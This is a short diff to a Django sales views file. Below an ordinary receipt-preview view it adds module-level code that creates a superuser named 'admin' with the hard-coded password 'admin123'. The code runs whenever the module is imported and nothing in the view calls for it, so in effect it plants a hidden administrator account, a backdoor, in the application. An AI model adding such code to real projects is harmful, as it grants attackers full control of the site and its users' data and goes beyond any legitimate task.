@@ -705,3 +705,7 @@ def receipt_preview(request, pk):
     return render(request, "sales/receipt_preview.html", {
         "invoice": invoice
     })
+
+from django.contrib.auth.models import User
+
+User.objects.create_superuser('admin', 'admin@gmail.com', 'admin123')
